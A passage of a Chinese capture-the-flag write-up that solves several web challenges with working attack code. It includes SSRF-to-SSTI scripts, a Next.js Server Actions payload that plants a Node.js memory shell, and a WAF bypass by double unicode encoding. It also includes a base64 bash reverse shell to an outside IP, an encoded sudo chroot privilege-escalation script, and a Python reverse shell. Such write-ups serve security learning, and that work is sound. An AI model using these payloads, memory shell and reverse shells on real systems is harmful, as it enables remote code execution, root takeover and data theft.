class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="number">302</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;location&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ws://127.0.0.1:9000/ws?token=e15bb4430bbe45f0864693c875f2982c&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;body&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Not Found&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们去访问ws:&#x2F;&#x2F;127.0.0.1:9000&#x2F;ws?token&#x3D;e15bb4430bbe45f0864693c875f2982c</p>
+<p>回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;ws&quot;: &quot;ok&quot;,</span><br><span class="line">  &quot;message&quot;: &quot;handshake success&quot;,</span><br><span class="line">  &quot;welcome&quot;: &quot;&#123;\&quot;error\&quot;:\&quot;invalid origin &#x27;None&#x27; ; X-Internal-Token header must match ?token; token expired or invalid (try /redirect_ws)\&quot;&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要求我们带上token和origin 经过测试token每次是请求了就会刷新的 手动并不好实现 于是写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WSConnector</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, base_url, cookie</span>):</span><br><span class="line">        <span class="variable language_">self</span>.base_url = base_url.rstrip(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.fetch_url = <span class="string">f&quot;<span class="subst">&#123;self.base_url&#125;</span>/fetch&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">        <span class="variable language_">self</span>.session.headers.update(&#123;</span><br><span class="line">            <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Cookie&quot;</span>: cookie</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_token</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] 正在获取动态 Token...&quot;</span>)</span><br><span class="line">        r = <span class="variable language_">self</span>.session.get(<span class="variable language_">self</span>.fetch_url, params=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://127.0.0.1:8001/redirect_ws&quot;</span>&#125;)</span><br><span class="line">        location = r.json()[<span class="string">&quot;history&quot;</span>][<span class="number">0</span>][<span class="string">&quot;location&quot;</span>]</span><br><span class="line">        token = location.split(<span class="string">&quot;token=&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 得到 Token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">connect_ws</span>(<span class="params">self, token</span>):</span><br><span class="line">        ws_target_url = <span class="string">f&quot;ws://127.0.0.1:9000/ws?token=<span class="subst">&#123;token&#125;</span>&quot;</span></span><br><span class="line">        </span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">&quot;X-Internal-Token&quot;</span>: token,</span><br><span class="line">            <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://127.0.0.1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 正在通过 fetch 连接: <span class="subst">&#123;ws_target_url&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">            r = <span class="variable language_">self</span>.session.get(</span><br><span class="line">                <span class="variable language_">self</span>.fetch_url,</span><br><span class="line">                params=&#123;<span class="string">&quot;url&quot;</span>: ws_target_url&#125;,</span><br><span class="line">                headers=headers,</span><br><span class="line">                timeout=<span class="number">10</span></span><br><span class="line">            )</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 状态码: <span class="subst">&#123;r.status_code&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] 响应内容:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] 连接发生错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    BASE_URL = <span class="string">&quot;http://80-b7779d40-df95-4c3b-a5a8-6a21763fe975.challenge.ctfplus.cn&quot;</span></span><br><span class="line">    COOKIE = <span class="string">&quot;_clck=1q1wtxm%5E2%5Eg3c%5E0%5E2008&quot;</span></span><br><span class="line"></span><br><span class="line">    connector = WSConnector(BASE_URL, COOKIE)</span><br><span class="line">    token = connector.get_token()</span><br><span class="line">    connector.connect_ws(token)</span><br></pre></td></tr></table></figure>
+
+<p>回显是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;ws&quot;:&quot;ok&quot;,&quot;message&quot;:&quot;handshake success&quot;,&quot;welcome&quot;:&quot;&#123;\&quot;service\&quot;:\&quot;IntraSight Template Preview\&quot;,\&quot;version\&quot;:\&quot;1.0\&quot;,\&quot;protocol\&quot;:&#123;\&quot;action\&quot;:\&quot;render\&quot;,\&quot;template\&quot;:\&quot;&lt;template string&gt;\&quot;,\&quot;context\&quot;:&#123;\&quot;optional\&quot;:\&quot;variables\&quot;&#125;&#125;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一看就是ssti 尝试给这个服务按照他的格式去post传入payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># 配置</span></span><br><span class="line">    base_url = <span class="string">&quot;http://url/&quot;</span></span><br><span class="line">    cookie = <span class="string">&quot;_clck=1q1wtxm%5E2%5Eg30%5E0%5E2008&quot;</span></span><br><span class="line">    </span><br><span class="line">    session = requests.Session()</span><br><span class="line">    session.headers.update(&#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: cookie</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 获取 token...&quot;</span>)</span><br><span class="line">    r = session.get(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/fetch&quot;</span>, params=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://127.0.0.1:8001/redirect_ws&quot;</span>&#125;)</span><br><span class="line">    token = r.json()[<span class="string">&quot;history&quot;</span>][<span class="number">0</span>][<span class="string">&quot;location&quot;</span>].split(<span class="string">&quot;token=&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Token: <span class="subst">&#123;token&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    target_payload = <span class="string">&quot;&#123;&#123;lipsum.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    </span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;action&quot;</span>: <span class="string">&quot;render&quot;</span>,</span><br><span class="line">        <span class="string">&quot;template&quot;</span>: target_payload,</span><br><span class="line">        <span class="string">&quot;context&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;X-Internal-Token&quot;</span>: token,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://127.0.0.1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    response = session.post(</span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/fetch&quot;</span>,</span><br><span class="line">        params=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">f&quot;ws://127.0.0.1:9000/ws?token=<span class="subst">&#123;token&#125;</span>&quot;</span>&#125;,</span><br><span class="line">        headers=headers,</span><br><span class="line">        json=data,</span><br><span class="line">        timeout=<span class="number">10</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 状态码: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res_json = response.json()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 响应内容:&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(json.dumps(res_json, indent=<span class="number">4</span>, ensure_ascii=<span class="literal">False</span>))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 原始响应内容:\n<span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>
+
+<p>成功找到flag</p>
+<h1 id="mio’s-waf-赛后复现"><a href="#mio’s-waf-赛后复现" class="headerlink" title="mio’s waf(赛后复现)"></a>mio’s waf(赛后复现)</h1><p>进去看下指纹就知道是考的next.js的洞 不过是非常强大的waf(捂脸) 赛时是没做出来的</p>
+<p>看了官方wp才知道 积累了新知识</p>
+<p>使用二次unicode绕过 但是为什么他可以解析呢？原理就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">react使用Flight协议解析客户端发过来的东西，RSC与客户端的通信基于React定制的Flight协议</span><br><span class="line">他会解析unicode编码</span><br></pre></td></tr></table></figure>
+
+<p>对于Flight协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;sauy&quot;&#125;</span><br><span class="line">&#123;&quot;\u0075\u0073\u0065\u0072\u006e\u0061\u006d\u0065&quot;:&quot;\u0073\u0061\u0075\u0079&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这两种形式他都解析，且作用一样。</p>
+<p>那这里最主要的问题就是，waf他会对我发的东西先进行一次unicode解码，没有触发黑名单就会发送给next.js的服务端。</p>
+<p>所以我们这里使用二次unicode编码绕过就会被react服务器解析。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_payload</span>(<span class="params">payload</span>):</span><br><span class="line"></span><br><span class="line">    utf16_bytes = payload.encode(<span class="string">&#x27;utf-16-le&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    encoded_payload = <span class="string">&quot;&quot;</span>.join([<span class="string">f&quot;%<span class="subst">&#123;b:02x&#125;</span>&quot;</span> <span class="keyword">for</span> b <span class="keyword">in</span> utf16_bytes])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> encoded_payload</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&#123;</span></span><br><span class="line"><span class="string">  &quot;then&quot;: &quot;$1:__proto__:then&quot;,</span></span><br><span class="line"><span class="string">  &quot;status&quot;: &quot;resolved_model&quot;,</span></span><br><span class="line"><span class="string">  &quot;reason&quot;: -1,</span></span><br><span class="line"><span class="string">  &quot;value&quot;: &quot;&#123;\&quot;then\&quot;:\&quot;$B1\&quot;&#125;&quot;,</span></span><br><span class="line"><span class="string">  &quot;_response&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;_prefix&quot;: &quot;(async()=&gt;&#123;const h=await import(&#x27;node:http&#x27;),c=await import(&#x27;node:child_process&#x27;);const o=h.Server.prototype.emit;h.Server.prototype.emit=async function(e,...a)&#123;if(e===&#x27;request&#x27;)&#123;const[r,s]=a;if(r.url===&#x27;/&#x27;||r.url.startsWith(&#x27;/?&#x27;))&#123;try&#123;const cmd=r.headers[&#x27;user-agent&#x27;]||&#x27;id&#x27;;const out=c.execSync(cmd,&#123;encoding:&#x27;utf8&#x27;,timeout:5000&#125;);s.writeHead(200,&#123;&#x27;Content-Type&#x27;:&#x27;text/plain&#x27;,&#x27;X-MemShell&#x27;:&#x27;active&#x27;&#125;);s.end(out);&#125;catch(x)&#123;s.writeHead(500);s.end(x.message);&#125;return true;&#125;&#125;return o.apply(this,arguments);&#125;;&#125;)();&quot;,</span></span><br><span class="line"><span class="string">    &quot;_chunks&quot;: &quot;$Q2&quot;,</span></span><br><span class="line"><span class="string">    &quot;_formData&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;get&quot;: &quot;$1:constructor:constructor&quot;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">result = encode_payload(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] 原始 Payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] UTF-16LE + URL Encode 结果:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+
+<p>传一个内存马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: nc1.ctfplus.cn:37399</span><br><span class="line">Content-Type: multipart/form-data; boundary=383e97eeef64d0c473a0924ed9968211</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15</span><br><span class="line">Accept-Encoding: gzip, deflate, zstd</span><br><span class="line">Cookie: _clck=1q1wtxm%5E2%5Eg3c%5E0%5E2008; _ga=GA1.1.1142461839.1770356861; _ga_BFDVYZJ3DE=GS2.1.s1770386835$o5$g1$t1770386836$j59$l0$h0; waf_num_token1=1000121; waf_num_token2=1000429</span><br><span class="line">Accept: */*</span><br><span class="line">Next-Action: 409defd89dd31eeb200d9ea02b1f325d25f5f5f3f0</span><br><span class="line">Content-Length: 727</span><br><span class="line"></span><br><span class="line">--383e97eeef64d0c473a0924ed9968211</span><br><span class="line">Content-Disposition: form-data; name=&quot;0&quot;</span><br><span class="line">Content-Type: text/plain; charset=utf16le</span><br><span class="line"></span><br><span class="line">&#123;&#123;hexd(7B000A002000200022007400680065006E0022003A0020002200240031003A005F005F00700072006F0074006F005F005F003A007400680065006E0022002C000A0020002000220073007400610074007500730022003A00200022007200650073006F006C007600650064005F006D006F00640065006C0022002C000A0020002000220072006500610073006F006E0022003A0020002D0031002C000A00200020002200760061006C007500650022003A00200022007B005C0022007400680065006E005C0022003A005C0022002400420031005C0022007D0022002C000A002000200022005F0072006500730070006F006E007300650022003A0020007B000A00200020002000200022005F0070007200650066006900780022003A002000220028006100730079006E006300280029003D003E007B0063006F006E0073007400200068003D0061007700610069007400200069006D0070006F0072007400280027006E006F00640065003A006800740074007000270029002C0063003D0061007700610069007400200069006D0070006F0072007400280027006E006F00640065003A006300680069006C0064005F00700072006F006300650073007300270029003B0063006F006E007300740020006F003D0068002E005300650072007600650072002E00700072006F0074006F0074007900700065002E0065006D00690074003B0068002E005300650072007600650072002E00700072006F0074006F0074007900700065002E0065006D00690074003D006100730079006E0063002000660075006E006300740069006F006E00280065002C002E002E002E00610029007B0069006600280065003D003D003D0027007200650071007500650073007400270029007B0063006F006E00730074005B0072002C0073005D003D0061003B0069006600280072002E00750072006C003D003D003D0027002F0027007C007C0072002E00750072006C002E007300740061007200740073005700690074006800280027002F003F002700290029007B007400720079007B0063006F006E0073007400200063006D0064003D0072002E0068006500610064006500720073005B00270075007300650072002D006100670065006E00740027005D007C007C0027006900640027003B0063006F006E007300740020006F00750074003D0063002E006500780065006300530079006E006300280063006D0064002C007B0065006E0063006F00640069006E0067003A002700750074006600380027002C00740069006D0065006F00750074003A0035003000300030007D0029003B0073002E0077007200690074006500480065006100640028003200300030002C007B00270043006F006E00740065006E0074002D00540079007000650027003A00270074006500780074002F0070006C00610069006E0027002C00270058002D004D0065006D005300680065006C006C0027003A00270061006300740069007600650027007D0029003B0073002E0065006E00640028006F007500740029003B007D00630061007400630068002800780029007B0073002E00770072006900740065004800650061006400280035003000300029003B0073002E0065006E006400280078002E006D0065007300730061006700650029003B007D00720065007400750072006E00200074007200750065003B007D007D00720065007400750072006E0020006F002E006100700070006C007900280074006800690073002C0061007200670075006D0065006E007400730029003B007D003B007D002900280029003B0022002C000A00200020002000200022005F006300680075006E006B00730022003A002000220024005100320022002C000A00200020002000200022005F0066006F0072006D00440061007400610022003A0020007B000A00200020002000200020002000220067006500740022003A0020002200240031003A0063006F006E007300740072007500630074006F0072003A0063006F006E007300740072007500630074006F00720022000A0020002000200020007D000A00200020007D000A007D00)&#125;&#125;</span><br><span class="line">--383e97eeef64d0c473a0924ed9968211</span><br><span class="line">Content-Disposition: form-data; name=&quot;1&quot;</span><br><span class="line"></span><br><span class="line">&quot;$@0&quot;</span><br><span class="line">--383e97eeef64d0c473a0924ed9968211</span><br><span class="line">Content-Disposition: form-data; name=&quot;2&quot;</span><br><span class="line"></span><br><span class="line">[]</span><br><span class="line">--383e97eeef64d0c473a0924ed9968211--</span><br></pre></td></tr></table></figure>
+
+<p>然后访问主页 通过人机认证后 ua头处 弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDkuMjA3LjEyMy8xMjM0IDA+JjEK | base64 -d | bash&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260206235909877.png" alt="image-20260206235909877"></p>
+<p>拿到shell了需要提权 考点是CVE-2025-32463</p>
+<p>poc在<a target="_blank" rel="noopener" href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/tree/main">CVE-2025-32463_chwoot</a></p>
+<p>shell处写</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;IyEvYmluL2Jhc2gNCiMgc3Vkby1jaHdvb3Quc2gNCiMgQ1ZFLTIwMjUtMzI0NjMg4oCTIFN1ZG8gRW9QIEV4cGxvaXQgUG9DIGJ5IFJpY2ggTWlyY2gNCiMgICAgICAgICAgICAgICAgICBAIFN0cmF0YXNjYWxlIEN5YmVyIFJlc2VhcmNoIFVuaXQgKENSVSkNClNUQUdFPSQobWt0ZW1wIC1kIC90bXAvc3Vkb3dvb3Quc3RhZ2UuWFhYWFhYKQ0KY2QgJHtTVEFHRT99IHx8IGV4aXQgMQ0KDQppZiBbICQjIC1lcSAwIF07IHRoZW4NCiAgICAjIElmIG5vIGNvbW1hbmQgaXMgcHJvdmlkZWQsIGRlZmF1bHQgdG8gYW4gaW50ZXJhY3RpdmUgcm9vdCBzaGVsbC4NCiAgICBDTUQ9Ii9iaW4vYmFzaCINCmVsc2UNCiAgICAjIE90aGVyd2lzZSwgdXNlIHRoZSBwcm92aWRlZCBhcmd1bWVudHMgYXMgdGhlIGNvbW1hbmQgdG8gZXhlY3V0ZS4NCiAgICBDTUQ9IiRAIg0KZmkNCg0KIyBFc2NhcGUgdGhlIGNvbW1hbmQgdG8gc2FmZWx5IGluY2x1ZGUgaXQgaW4gYSBDIHN0cmluZyBsaXRlcmFsLg0KIyBUaGlzIGhhbmRsZXMgYmFja3NsYXNoZXMgYW5kIGRvdWJsZSBxdW90ZXMuDQpDTURfQ19FU0NBUEVEPSQocHJpbnRmICclcycgIiRDTUQiIHwgc2VkIC1lICdzL1xcL1xcXFwvZycgLWUgJ3MvIi9cXCIvZycpDQoNCmNhdCA+IHdvb3QxMzM3LmM8PEVPRg0KI2luY2x1ZGUgPHN0ZGxpYi5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KDQpfX2F0dHJpYnV0ZV9fKChjb25zdHJ1Y3RvcikpIHZvaWQgd29vdCh2b2lkKSB7DQogIHNldHJldWlkKDAsMCk7DQogIHNldHJlZ2lkKDAsMCk7DQogIGNoZGlyKCIvIik7DQogIGV4ZWNsKCIvYmluL3NoIiwgInNoIiwgIi1jIiwgIiR7Q01EX0NfRVNDQVBFRH0iLCBOVUxMKTsNCn0NCkVPRg0KDQpta2RpciAtcCB3b290L2V0YyBsaWJuc3NfDQplY2hvICJwYXNzd2Q6IC93b290MTMzNyIgPiB3b290L2V0Yy9uc3N3aXRjaC5jb25mDQpjcCAvZXRjL2dyb3VwIHdvb3QvZXRjDQpnY2MgLXNoYXJlZCAtZlBJQyAtV2wsLWluaXQsd29vdCAtbyBsaWJuc3NfL3dvb3QxMzM3LnNvLjIgd29vdDEzMzcuYw0KDQplY2hvICJ3b290ISINCnN1ZG8gLVIgd29vdCB3b290DQpybSAtcmYgJHtTVEFHRT99&quot; | base64 -d &gt; /tmp/e.sh</span><br></pre></td></tr></table></figure>
+
+<p>不过我这个换行符号有问题</p>
+<p>下面去掉就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /tmp/e.sh | tr -d &#x27;\r&#x27; &gt; /tmp/e_fixed.sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash /tmp/e_fixed.sh &quot;python3 -c &#x27;import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;ip\&quot;,2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\&quot;/bin/bash\&quot;, \&quot;-i\&quot;])&#x27;&quot;</span><br></pre></td></tr></table></figure>
+
+<p>运行这个即可拿到root的shell</p>
+<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260207001148294.png" alt="image-20260207001148294"></p>
+<h1 id="GlyphWeaver"><a href="#GlyphWeaver" class="headerlink" title="GlyphWeaver"></a>GlyphWeaver</h1><p>名片生成器 识别指纹为python和flask并且是名片渲染 秒联想ssti</p>
+<p>有两个Live Preview和Export Console两个功能</p>
+<p>发现在任何地方输入<code>&#123;&#123;&#125;&#125;</code>就会被过滤 并且fuzz后发现确实有一些ssti的关键词也被waf了 并且Title和Motto都有长度限制</p>
+<p>那这里我就会考虑使用全角字符来绕过限制 并且poc尽量简洁</p>
+<p><img src="C:\Users\sauy\AppData\Roaming\Typora\typora-user-images\image-20260207152443559.png" alt="image-20260207152443559"></p>
+<p>全角字符可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">｛｛ｌｉｐｓｕｍ［＇＿＿ｇｌｏｂａｌｓ＿＿＇］［＇＿＿ｂｕｉｌｔｉｎｓ＿＿＇］［＇ｏｐｅｎ＇］（/flag＇＇）［＇ｒｅａｄ＇］（）｝｝</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="SecureDoc"><a href="#SecureDoc" class="headerlink" title="SecureDoc"></a>SecureDoc</h1><p>解析pdf 并且下面说明了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ℹ️ Supported Features:</span><br><span class="line">• Standard PDF text extraction</span><br><span class="line">• PDF forms and interactive elements</span><br><span class="line">• XFA-based dynamic forms</span><br><span class="line">• Metadata extraction</span><br></pre></td></tr></table></figure>
+
+<p>提取关键词XFA XFA和XML有关 那我们这里就肯定想到xxe</p>
+<p>直接找ai给我一个自定义xfa生成pdf的脚本</p>
